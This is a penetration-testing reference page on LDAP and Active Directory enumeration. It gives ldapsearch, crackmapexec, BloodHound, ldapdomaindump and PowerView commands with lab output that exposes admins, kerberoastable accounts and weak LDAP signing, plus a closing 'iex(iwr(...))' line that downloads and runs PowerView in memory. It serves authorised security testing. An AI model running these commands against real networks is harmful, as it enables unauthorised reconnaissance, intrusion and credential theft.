<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# LDAP Enumeration
## Tags
<details><summary>Tags (Click to expand)</summary><p>

Environment

		#@active #@directory #@activedirectory #@microsoft

Context

		#@enum #@enumerate #@enumeration #@ldap

Tools

		#@impacket #@nmap #@zmap #@ldapsearch #@ldapsearch-ad #@rpcclient #@smbmap #@crackmapexec #@manspider #@adidnsdump #@dnsrecon #@enum4linux #@nopac

</p></details>

## References


## Overview



## Attacks
### From a Linux Machine
#### No Credentials Required (Usually)
* Broad Enumeration
	* <details><summary>Dump Broad LDAP information from a relay attack ([AD MITM and Relay Attacks Guide](Testaments_and_Books/Redvelations/Active_Directory/003-1_AD_NTLM_Capture_and_Relay_Attacks.md)) (Click to expand)</summary><p>
		* Note that relay dump data can be made compatible with BloodHound
			* <details><summary>ldapdomaindump's ldd2bloodhound -<br />[https://github.com/dirkjanm/ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) (Click to expand)</summary><p>
				* ldd2bloodhound conversion

						ldd2bloodhound file.json
					* Example Output

							root@jack-Virtual-Machine:~/ldapdomaindump-output# ldd2bloodhound *.json
							Done!
							root@jack-Virtual-Machine:~/ldapdomaindump-output# find -iname "*.csv"
							./trusts.csv
							./group_membership.csv
	* <details><summary>enum4linux ([enum4linux Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/enum4linux.md)) (Click to expand)</summary><p>

			enum4linux-ng.py -L $DOMAIN_CONTROLLER
		* Options
			* `-R` - enable RID cycling
	* <details><summary>ldapsearch ([ldapsearch Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/ldapsearch.md)) (Click to expand)</summary><p>

			ldapsearch-ad.py -l $DOMAIN_CONTROLLER -t info
		* Example Output

				(ldapsearch-ad) root@jack-Virtual-Machine:~/ldapsearch-ad# python ldapsearch-ad.py -l $DOMAIN_CONTROLLER -t info
				### Server infos ###
				[+] Forest functionality level = Windows 2016
				[+] Domain functionality level = Windows 2016
				[+] Domain controller functionality level = Windows 2016
				[+] rootDomainNamingContext = DC=microsoftdelivery,DC=com
				[+] defaultNamingContext = DC=microsoftdelivery,DC=com
				[+] ldapServiceName = microsoftdelivery.com:dc01$@MICROSOFTDELIVERY.COM
				[+] naming_contexts = ['DC=microsoftdelivery,DC=com', 'CN=Configuration,DC=microsoftdelivery,DC=com', 'CN=Schema,CN=Configuration,DC=microsoftdelivery,DC=com', 'DC=DomainDnsZones,DC=microsoftdelivery,DC=com', 'DC=ForestDnsZones,DC=microsoftdelivery,DC=com']
* Check the forest functional level
	* <details><summary>ldapsearch-ad.py ([ldapsearch Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/ldapsearch.md)) (Click to expand)</summary><p>
		* No Credentials Required

				ldapsearch-ad.py -l $DOMAIN_CONTROLLER -t info
			* Example Output

					(ldapsearch-ad) root@jack-Virtual-Machine:~/ldapsearch-ad# python ldapsearch-ad.py -l $DOMAIN_CONTROLLER -t info
					### Server infos ###
					[+] Forest functionality level = Windows 2016
					[+] Domain functionality level = Windows 2016
					[+] Domain controller functionality level = Windows 2016
					[+] rootDomainNamingContext = DC=microsoftdelivery,DC=com
					[+] defaultNamingContext = DC=microsoftdelivery,DC=com
					[+] ldapServiceName = microsoftdelivery.com:dc01$@MICROSOFTDELIVERY.COM
					[+] naming_contexts = ['DC=microsoftdelivery,DC=com', 'CN=Configuration,DC=microsoftdelivery,DC=com', 'CN=Schema,CN=Configuration,DC=microsoftdelivery,DC=com', 'DC=DomainDnsZones,DC=microsoftdelivery,DC=com', 'DC=ForestDnsZones,DC=microsoftdelivery,DC=com']
* Check the domain functional level
	* <details><summary>ldapsearch-ad.py ([ldapsearch Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/ldapsearch.md)) (Click to expand)</summary><p>
		* No Credentials Required

				ldapsearch-ad.py -l $DOMAIN_CONTROLLER -t info
			* Example Output

					(ldapsearch-ad) root@jack-Virtual-Machine:~/ldapsearch-ad# python ldapsearch-ad.py -l $DOMAIN_CONTROLLER -t info
					### Server infos ###
					[+] Forest functionality level = Windows 2016
					[+] Domain functionality level = Windows 2016
					[+] Domain controller functionality level = Windows 2016
					[+] rootDomainNamingContext = DC=microsoftdelivery,DC=com
					[+] defaultNamingContext = DC=microsoftdelivery,DC=com
					[+] ldapServiceName = microsoftdelivery.com:dc01$@MICROSOFTDELIVERY.COM
					[+] naming_contexts = ['DC=microsoftdelivery,DC=com', 'CN=Configuration,DC=microsoftdelivery,DC=com', 'CN=Schema,CN=Configuration,DC=microsoftdelivery,DC=com', 'DC=DomainDnsZones,DC=microsoftdelivery,DC=com', 'DC=ForestDnsZones,DC=microsoftdelivery,DC=com']
* Check for LDAP Signing and Binding Requirements/Status
	* <details><summary>crackmapexec (Click to expand)</summary><p>
		* Example

				crackmapexec ldap -M ldap-signing $DOMAIN_CONTROLLER
			* Example Output

					root@jack-Virtual-Machine:~/ldapsearch-ad# crackmapexec ldap -M ldap-signing dc01.$DOMAIN
					SMB         dc01.microsoftdelivery.com 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:microsoftdelivery.com) (signing:True) (SMBv1:False)
					LDAP-SIG... dc01.microsoftdelivery.com 389    DC01             LDAP signing is NOT enforced on dc01.microsoftdelivery.com

#### Credentials Required (Usually)

* Broad LDAP Enumeration Tools
	* BloodHound Ingestors (Note: Windows ingestors are recommended if possible) -<br />[https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
		* <details><summary>bloodhound.py ([bloodhound.py Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/Bloodhound/002-0_Ingestors.md)) (Click to expand)</summary><p>
			* Parameters
				* `-c` - Collection Method (comma separated) (default: Default)
					* Supported: Group, LocalAdmin, Session, Trusts, Default (all previous), DCOnly (no computer connections), DCOM, RDP, PSRemote, LoggedOn, ObjectProps, ACL, All (all except LoggedOn)
			* Example 1: LDAP Data only

					python bloodhound.py -u $DOMAIN_USER -p $PASSWORD -c DCOnly -d $DOMAIN
				* <details><summary>Sample Output (Click to expand)</summary><p>

						(BloodHound.py-F7gCb-C8) root@ubuntu:~/Tools/02_Enum/BloodHound.py# python bloodhound.py -u $DOMAIN_USER -p 'P@ssw0rd' -c DCOnly -d securelab.local
						INFO: Found AD domain: securelab.local
						INFO: Connecting to LDAP server: DC01.securelab.local
						INFO: Found 1 domains
						INFO: Found 1 domains in the forest
						INFO: Found 16 computers
						INFO: Connecting to LDAP server: DC01.securelab.local
						INFO: Found 6 users
						INFO: Found 53 groups
						INFO: Found 6 computers
						INFO: Found 0 trusts
						INFO: Done in 00M 00S
	* <details><summary>adalanche (Click to expand) -<br />[https://github.com/lkarlslund/adalanche](https://github.com/lkarlslund/adalanche)</summary><p>
		* Examples
			* Example 1: "What finally worked in the lab"

					./adalanche-linux-x64-v2022.5.19-34-ga528dc2 collect activedirectory --username 'domain_user' --password 'P@ssw0rd'  --server 'dc01.microsoftdelivery.com' --ignorecert
				* Example Output

						root@jack-Virtual-Machine:~/Adalanche# ./adalanche-linux-x64-v2022.5.19-34-ga528dc2 collect activedirectory --username 'domain_user' --password 'P@ssw0rd'  --server 'dc01.microsoftdelivery.com' --ignorecert
						20:16:39.625  WARNING  Problem loading preferences: open preferences.json: no such file or directory               
						20:16:39.625  INFORMA  adalanche v2022.5.19-34-ga528dc2 (non-release), (c) 2020-2022 Lars Karlslund, This program comes with ABSOLUTELY NO WARRANTY            
						20:16:39.637  INFORMA  Probing RootDSE ...     
						| Dumping from  ... (1/-, 62 objects/s)  
						20:16:39.654  INFORMA  Saving RootDSE ...
						| Dumping from  ... (1/-, 503 objects/s) 
						20:16:39.658  INFORMA  Collecting schema objects ...           
						| Dumping from CN=Schema,CN=Configuration,DC=microsoftdelivery,DC=com ... (1770/-, 1074 objects/s) 
						20:16:41.519  INFORMA  Collecting configuration objects ...    
						- Dumping from CN=Configuration,DC=microsoftdelivery,DC=com ... (1664/-, 734 objects/s)      
						20:16:43.924  INFORMA  Collecting other objects ...            
						20:16:43.924  INFORMA  Collecting from base DN DC=DomainDnsZones,DC=microsoftdelivery,DC=com ...   
						| Dumping from DC=DomainDnsZones,DC=microsoftdelivery,DC=com ... (44/-, 803 objects/s)       
						20:16:43.994  INFORMA  Collecting from base DN DC=ForestDnsZones,DC=microsoftdelivery,DC=com ...   
						| Dumping from DC=ForestDnsZones,DC=microsoftdelivery,DC=com ... (18/-, 1490 objects/s)      
						20:16:44.016  INFORMA  Collecting main AD objects ...          
						\ Dumping from DC=microsoftdelivery,DC=com ... (283/-, 709 objects/s)  
						20:16:44.462  INFORMA  Collecting group policy files from \\microsoftdelivery.com\sysvol\microsoftdelivery.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9} 
						...
						20:16:44.463  WARNING  Can't access path, aborting this GPO ...
						20:16:44.463  INFORMA  Collecting group policy files from \\microsoftdelivery.com\sysvol\microsoftdelivery.com\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9} 
						...
						20:16:44.463  WARNING  Can't access path, aborting this GPO ...
						20:16:44.463  INFORMA  Terminating successfully
			* Example 2: Data Collection

					Adalanche collect activedirectory --ignorecert --domain $DOMAIN --authdomain $DOMAIN-NETBIOS --username $DOMAIN_USER --password $PASSWORD
			* Example 3: When domain has channel binding/signing requirements

					Adalanche collect activedirectory --port 389 --tlsmode NoTLS
			* Example 4: Parse data collected from sysinternals' adexplorer.exe -<br />[https://download.sysinternals.com/files/AdExplorer.zip](https://download.sysinternals.com/files/AdExplorer.zip)

					Adalanche collect activedirectory --adexplorerfile=yoursavedfile.bin
			* Example 5: Analyze the data after collected/parsed

					Adalanche collect activedirectory --datapath=data/domain1 --domain=domain1

			* [https://github.com/blurbdust/ldd2bh](https://github.com/blurbdust/ldd2bh)
	* <details><summary>ldapdomaindump -<br />[https://github.com/dirkjanm/ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) (Click to expand)</summary><p>
		* Examples
			* Example 1

					ldapdomaindump -u $DOMAIN\\$DOMAIN_USER -p $PASSWORD $DOMAIN_CONTROLLER
			* Example Output

					root@jack-Virtual-Machine:~# ldapdomaindump -u $DOMAIN\\$DOMAIN_USER -p $PASSWORD $DOMAIN_CONTROLLER
					[*] Connecting to host...
					[*] Binding to host
					[+] Bind OK
					[*] Starting domain dump
					[+] Domain dump finished
			* Report results

					root@jack-Virtual-Machine:~/ldapdomaindump-output# ls -lah
					total 324K
					drwxr-xr-x  2 root root 4.0K Aug 18 19:31 .
					drwx------ 40 root root 4.0K Aug 18 19:31 ..
					-rw-r--r--  1 root root 5.0K Aug 18 19:28 domain_computers_by_os.html
					-rw-r--r--  1 root root 2.1K Aug 18 19:28 domain_computers.grep
					-rw-r--r--  1 root root 4.4K Aug 18 19:28 domain_computers.html
					-rw-r--r--  1 root root  41K Aug 18 19:28 domain_computers.json
					-rw-r--r--  1 root root  11K Aug 18 19:28 domain_groups.grep
					-rw-r--r--  1 root root  18K Aug 18 19:28 domain_groups.html
					-rw-r--r--  1 root root  89K Aug 18 19:28 domain_groups.json
					-rw-r--r--  1 root root  275 Aug 18 19:28 domain_policy.grep
					-rw-r--r--  1 root root 1.2K Aug 18 19:28 domain_policy.html
					-rw-r--r--  1 root root 7.5K Aug 18 19:28 domain_policy.json
					-rw-r--r--  1 root root   71 Aug 18 19:28 domain_trusts.grep
					-rw-r--r--  1 root root  828 Aug 18 19:28 domain_trusts.html
					-rw-r--r--  1 root root    2 Aug 18 19:28 domain_trusts.json
					-rw-r--r--  1 root root  20K Aug 18 19:28 domain_users_by_group.html
					-rw-r--r--  1 root root 4.7K Aug 18 19:28 domain_users.grep
					-rw-r--r--  1 root root  12K Aug 18 19:28 domain_users.html
					-rw-r--r--  1 root root  57K Aug 18 19:28 domain_users.json
			* ldd2bloodhound conversion

					root@jack-Virtual-Machine:~/ldapdomaindump-output# ldd2bloodhound *.json
					Done!
					root@jack-Virtual-Machine:~/ldapdomaindump-output# find -iname "*.csv"
					./trusts.csv
					./group_membership.csv
	* <details><summary>ldapsearch ([ldapsearch Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/ldapsearch.md)) (Click to expand)</summary><p>
		* Example

				python ldapsearch-ad.py -l $DOMAIN_CONTROLLER  -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -t all
			* Example Output

					(ldapsearch-ad) root@jack-Virtual-Machine:~/ldapsearch-ad# python ldapsearch-ad.py -l $DOMAIN_CONTROLLER  -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -t all
					### Server infos ###
					[+] Domain functionality level = Windows 2016
					[+] Domain controller functionality level = Windows 2016
					[+] rootDomainNamingContext = DC=microsoftdelivery,DC=com
					[+] defaultNamingContext = DC=microsoftdelivery,DC=com
					[+] ldapServiceName = microsoftdelivery.com:dc01$@MICROSOFTDELIVERY.COM
					[+] naming_contexts = ['DC=microsoftdelivery,DC=com', 'CN=Configuration,DC=microsoftdelivery,DC=com', 'CN=Schema,CN=Configuration,DC=microsoftdelivery,DC=com', 'DC=DomainDnsZones,DC=microsoftdelivery,DC=com', 'DC=ForestDnsZones,DC=microsoftdelivery,DC=com']
					### Result of "trusts" command ###
					### Result of "pass-pols" command ###
					[+] Default password policy:
					[+] |___Minimum password length = 7
					[+] |___Password complexity = Enabled
					[*] |___Lockout threshold = Disabled
					[*] |___Password history length = 24
					[+] |___Max password age = 1000000000 days, 0 hours, 0 minutes, 0 seconds
					[+] |___Min password age = 0 seconds
					[+] No fine grained password policy found (high privileges are required).
					### Result of "admins" command ###
					[+] All members of group "Domain Admins":
					[+]     Administrator
					[*]     domain_admin (DONT_EXPIRE_PASSWORD)
					[+] All members of group "Administrators":
					[+]     Administrator
					[*]     domain_admin (DONT_EXPIRE_PASSWORD)
					[+] All members of group "Enterprise Admins":
					[+]     Administrator
					[*]     domain_admin (DONT_EXPIRE_PASSWORD)
					### Result of "kerberoast" command ###
					[*] kerberoastable : cifs/dc01.microsoftdelivery.com
					### Result of "asreqroast" command ###
					[*] {'cn': 'kerberoastable', 'sAMAccountName': 'kerberoastable'}
					[*] {'cn': 'asrep roastable', 'sAMAccountName': 'asreproastable'}
					### Result of "goldenticket" command ###
					[+] krbtgt password changed at 2022-06-24 17:43:05
* Direct LDAP Queries (See bottom of page for cheat sheet)
	* <details><summary>impacket's secretsdump.py (modified) (currently unmerged branch, but may be soon after this writing of 2022.09) (Click to expand) -<br />[https://github.com/snovvcrash/impacket/tree/secretsdump-ldapfilter](https://github.com/snovvcrash/impacket/tree/secretsdump-ldapfilter)</summary></details><p>
		* References
			* snovvcrash's twitter -<br />[https://twitter.com/snovvcrash/status/1551938466090553351](https://twitter.com/snovvcrash/status/1551938466090553351)
		* Example 1: Kerberos Authentication, Query for Domain Administrators (Users with adminCount=1)

				secretsdump.py -k -no-pass $DOMAIN_CONTROLLER -dc-ip $DC_IP -ldapfilter '(&(objectClass=user)(adminCount=1))'

* Enumerate Computers that have never logged on and do not require a password (Useful for computer pre-creation attack)
* Enumerate Trust information ([`Gather Victim Network Information - Network Trust Dependencies` TTP](TTP/T1590_Gather_Victim_Network_Information/003_Network_Trust_Dependencies/T1590.003.md))
	* <details><summary>ldapsearch ([ldapsearch Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/ldapsearch.md)) (Click to expand)</summary><p>
		* Example

				python ldapsearch-ad.py -l $DOMAIN_CONTROLLER  -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -t trusts
* Enumerate Administrators and admin password reset information
	* <details><summary>ldapdomaindump -<br />[https://github.com/dirkjanm/ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) (Click to expand)</summary><p>
		* Example

				python ldapsearch-ad.py -l $DOMAIN_CONTROLLER  -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -t admins
			* Example Output

					(ldapsearch-ad) root@jack-Virtual-Machine:~/ldapsearch-ad# python ldapsearch-ad.py -l $DOMAIN_CONTROLLER  -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -t admins
					### Result of "admins" command ###
					[+] All members of group "Domain Admins":
					[+]     Administrator
					[*]     domain_admin (DONT_EXPIRE_PASSWORD)
					[+] All members of group "Administrators":
					[+]     Administrator
					[*]     domain_admin (DONT_EXPIRE_PASSWORD)
					[+] All members of group "Enterprise Admins":
					[+]     Administrator
					[*]     domain_admin (DONT_EXPIRE_PASSWORD)
* Check for LDAP Signing and Binding Requirements/Status
	* <details><summary>crackmapexec (Click to expand)</summary><p>
		* Example

				crackmapexec ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -M ldap-checker
			* Example Output

					root@jack-Virtual-Machine:~# crackmapexec ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -M ldap-checker
					SMB         dc01.microsoftdelivery.com 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:microsoftdelivery.com) (signing:True) (SMBv1:False)
					LDAP        dc01.microsoftdelivery.com 389    DC01             [+] microsoftdelivery.com\domain_user:P@ssw0rd 
					LDAP-CHE... dc01.microsoftdelivery.com 389    DC01             LDAP Signing NOT Enforced!
					LDAP-CHE... dc01.microsoftdelivery.com 389    DC01             Channel Binding is set to "NEVER" - Time to PWN!
	* zyn3rgy's GitHub: LdapRelayScan -<br />[https://github.com/zyn3rgy/LdapRelayScan](https://github.com/zyn3rgy/LdapRelayScan)
* ADCS: [ADCS Enumeration Guide](Testaments_and_Books/Redvelations/Active_Directory/001-5_ADCS_Enumeration.md)
* Enumerate the Machine Account Quota
	* <details><summary>crackmapexec (Click to expand)</summary><p>
		* Example

				crackmapexec ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -M MAQ
			* Example Output

					root@jack-Virtual-Machine:~# crackmapexec ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -M MAQ
					SMB         dc01.microsoftdelivery.com 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:microsoftdelivery.com) (signing:True) (SMBv1:False)
					LDAP        dc01.microsoftdelivery.com 389    DC01             [+] microsoftdelivery.com\domain_user:P@ssw0rd 
					MAQ         dc01.microsoftdelivery.com 389    DC01             [*] Getting the MachineAccountQuota
					MAQ         dc01.microsoftdelivery.com 389    DC01             MachineAccountQuota: 10
* Subnet Enumeration
	* <details><summary>crackmapexec (Click to expand)</summary><p>
		* Example 1: "subnets" module

				crackmapexec ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -M subnets
			* Example Output

					root@jack-Virtual-Machine:~# crackmapexec ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -M subnets
					SMB         dc01.microsoftdelivery.com 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:microsoftdelivery.com) (signing:True) (SMBv1:False)
					LDAP        dc01.microsoftdelivery.com 389    DC01             [+] microsoftdelivery.com\domain_user:P@ssw0rd 
					SUBNETS     dc01.microsoftdelivery.com 389    DC01             [*] Getting the Sites and Subnets from domain
					SUBNETS     dc01.microsoftdelivery.com 389    DC01             Site "Default-First-Site-Name"
		* Example 2: "find-subnet" module (Note: This appearedin a tweet and may only be available in porchetta industries at the time of this writing, 2022.08)

				crackmapexec ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -M find-subnet
* List user descriptions
	* <details><summary>crackmapexec (Click to expand)</summary><p>
		* Example

				crackmapexec ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -M user-desc
			* Example

					crackmapexec ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -M user-desc
					SMB         dc01.microsoftdelivery.com 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:microsoftdelivery.com) (signing:True) (SMBv1:False)
					LDAP        dc01.microsoftdelivery.com 389    DC01             [+] microsoftdelivery.com\domain_user:P@ssw0rd 
					USER-DES...   User: krbtgt - Description: Key Distribution Center Service Account
					USER-DES...   Saved 4 user descriptions to /root/.cme/logs/UserDesc-dc01.microsoftdelivery.com-20220813_211406.log
* List all domain users
	* <details><summary>ldapsearch (Click to expand)</summary><p>

			ldapsearch -LLL -x -H ldap://$DOMAIN_CONTROLLER -D "jar-jar.binks@pwny.lab" -w Welcome2015 -b dc=pwny,dc=lab "(objectClass=user)" sAMAccountName userPrincipalName memberOf
* Password Policy
	* <details><summary>ldapsearch-ad.py ([ldapsearch Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/ldapsearch.md)) (Click to expand)</summary><p>
		
				ldapsearch-ad.py -l $LDAP_SERVER -d $DOMAIN -u $USER -p $PASSWORD -t pass-pol
			* Example Output

					(ldapsearch-ad) root@jack-Virtual-Machine:~/ldapsearch-ad# python ldapsearch-ad.py -l $DOMAIN_CONTROLLER  -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD -t pass-pols
					### Result of "pass-pols" command ###
					[+] Default password policy:
					[+] |___Minimum password length = 7
					[+] |___Password complexity = Enabled
					[*] |___Lockout threshold = Disabled
					[*] |___Password history length = 24
					[+] |___Max password age = 1000000000 days, 0 hours, 0 minutes, 0 seconds
					[+] |___Min password age = 0 seconds
					[+] No fine grained password policy found (high privileges are required).
* List all domain groups
	* <details><summary>ldapsearch (Click to expand)</summary><p>

				ldapsearch -LLL -x -H ldap://$DOMAIN_CONTROLLER -D "jar-jar.binks@pwny.lab" -w Welcome2015 -b dc=pwny,dc=lab "(objectClass=group)" sAMAccountName member memberOf
* List all domain joined systems
	* <details><summary>ldapsearch (Click to expand)</summary><p>

			ldapsearch -LLL -x -H ldap://$DOMAIN_CONTROLLER -D "jar-jar.binks@pwny.lab" -w Welcome2015 -b dc=pwny,dc=lab "(objectClass=computer)" name dNSHostname operatingSystem operatingSystemVersion lastLogonTimestamp servicePrincipalName
* Enumerate all members of a group
	* <details><summary>ldapsearch (Click to expand)</summary><p>

			ldapsearch -LLL -x -H ldap://$DOMAIN_CONTROLLER -D "jar-jar.binks@pwny.lab" -w Welcome2015 -b dc=pwny,dc=lab "(&(objectClass=user)(memberof:1.2.840.113556.1.4.1941:=CN=Domän-Admins,CN=Users,DC=PWNY,DC=LAB))" | grep sAMAccountName | cut -d" " -f2
* Enumerate all groups a user is member of
	* <details><summary>ldapsearch (Click to expand)</summary><p>

			ldapsearch -LLL -x -H ldap://$DOMAIN_CONTROLLER -D "jar-jar.binks@pwny.lab" -w Welcome2015 -b dc=pwny,dc=lab "(sAMAccountName=darth.vader)" sAMAccountName userPrincipalName memberOf | grep memberOf | cut -d "=" -f2 | cut -d"," -f1

### From a Windows Machine

* BloodHound Ingestors -<br />[https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
	* .NET
		* <details><summary>Recommended: Sharphound.exe (Bloodhound) -<br />[https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) (Click to expand)</summary><p>

				.\SharpHound.exe -c <collection:all,GPOLocalGroup> -d <domain>.<tld> --throttle <10000> --ZipFilename <outfile.zip> --EncryptZip --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller <DC_IP> --jitter <23>
	* PowerShell
		* <details><summary>Recommended: Sharphound.ps1<br />[https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1) (Click to expand)</summary><p>
			* Requirements
				* The Powershell session must be running `-ExecutionPolicy Bypass`.
			* Example

					Invoke-BloodHound -CollectionMethod All  -LDAPUser $DOMAIN_USER -LDAPPass $PASSWORD -OutputDirectory <PathToFile>
			* File is installed at `/usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1`
	* Remote Windows System
		* <details><summary>Recommended: Sharphound.exe (Bloodhound) -<br />[https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) (Click to expand)</summary><p>
	 		* Process
				1. From a command prompt (in a blank Windows VM or something of the like), run:

						runas /netonly /user:$DOMAIN-NETBIOS\$DOMAIN_USER "powershell -ep bypass"
				1. Type in the domain user's password and press enter.
				1. In the new Powershell window, simply import and run the collection script as usual:

						import-module .\sharphound.ps1
						invoke-bloodhound -domain $DOMAIN
				1. If you're running on your own VM, you should use **SharpHound.exe** (Faster, more reliable):
					1. From a command prompt (in a blank Windows VM or something of the like), run:

							runas /netonly /user:$DOMAIN-NETBIOS\$DOMAIN_USER "powershell -ep bypass"
					1. Type in the domain user's password and press enter
					1. In the new Powershell window, simply import and run the collection script as usual:

							SharpHound.exe --CollectionMethod All --domain $DOMAIN
	* LOLBAS and Sysinternals
		* <details><summary>sysinternals' adexplorer.exe -<br />[https://download.sysinternals.com/files/AdExplorer.zip](https://download.sysinternals.com/files/AdExplorer.zip) (Click to expand)</summary><p>
			* <details><summary>References (Click to expand)</summary><p>
				* BHIS Blog: Domain Goodness – How I Learned to LOVE AD Explorer -<br />[https://www.blackhillsinfosec.com/domain-goodness-learned-love-ad-explorer/](https://www.blackhillsinfosec.com/domain-goodness-learned-love-ad-explorer/)
				* TrustSec Blog: ADExplorer on Engagements -<br />[https://www.trustedsec.com/blog/adexplorer-on-engagements/](https://www.trustedsec.com/blog/adexplorer-on-engagements/)
				* Microsoft Documentation: ADExplorer.exe -<br />[https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
			* Overview, Requirements
				* A registry must be added to accept the EULA when running the tool from the command-line:

						reg add “HKCU\software\Sysinternals\Active Directory Explorer” /v EulaAccepted /t REG_DWORD /d 1 /f & ADexplorer.exe -snapshot “” ad_snapshot.dat
			* Examples
				* Example 1: Command-Line Create Snapshot

						adexplorer.exe -snapshot “” mysnap.dat
				* Example 2: Run adexplorer.exe without uploading it first

						\\live.sysinternals.com\tools\adexplorer.exe -snapshot “” snap.dat
			* Convert to bloodhound-compatible with the ADEXplorerSnapshot python tool -<br />[https://github.com/c3c/ADExplorerSnapshot.py](https://github.com/c3c/ADExplorerSnapshot.py)
* LOLBAS and Sysinternals
	* Enumerate Computers that have never logged on and do not require a password (Useful for computer pre-creation attack)
		* <details><summary>References (Click to expand)</summary><p>
			* TrustedSec Blog: Diving into pre-created computer accounts -<br />[https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)
			* Guidance on UserAccountControl flags
				* Microsoft Docs: Use the UserAccountControl flags to manipulate user account properties -<br />[https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)
		* <details><summary>ADExplorer (Click to expand)</summary><p>
			1. Connect ADExplorer
			1. Apply filters for the following:
				* Account has never logged on
				* userAccountControl is `4128`, which is the sum of the below attributes:
					* `32` – `PASSWD_NOTREQD`
					* `4096` – `WORKSTATION_TRUST_ACCOUNT`
* Username Enumeration
	* Powershell
		* <details><summary>Scripts (Click to expand)</summary><p>
			* All domain usernames (without AD module)

					$search = [adsisearcher]"(&(ObjectCategory=Person)(ObjectClass=User))"
					$search.PageSize = 200
					$search.PropertiesToLoad.Add("SamAccountName")
					$users = $search.FindAll()
					$results=foreach($user in $users) {
						 $SamAccountName = $user.Properties['SamAccountName']
						 "$SamAccountName"
					}
					$results | Out-File domain_users.txt
		* <details><summary>PowerView (Click to expand)</summary><p>

				Get-NetUser -Credential $Cred | Format-Table name, samaccountname, userprincipalname, description
		* <details><summary>Powerview (Click to expand)</summary><p>

				Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
				Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
* .NET
* PowerShell
	* <details><summary>Active Directory Module (Click to expand)</summary><p>
		* .

				`Get-ADUser -Filter * -Properties *`
		* .

				`Get-ADUser -Identity student1 -Properties *`
		* .

				`Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description`
			* Many times, you may find passwords in the description fields, inspect them closely
		* .

				`Get-ADComputer -Filter * | select Name`
		* .

				`Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem`
		* .

				`Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}`
			* utilizes ICMP packets, so results may not be accurate depending on network security in place
		* .

				`Get-ADComputer -Filter * -Properties *`
	* <details><summary>PowerView (Powersploit) (Click to expand)</summary><p>
		* Harmj0y Guide
			* [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
		* Download

				iex(iwr("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"))
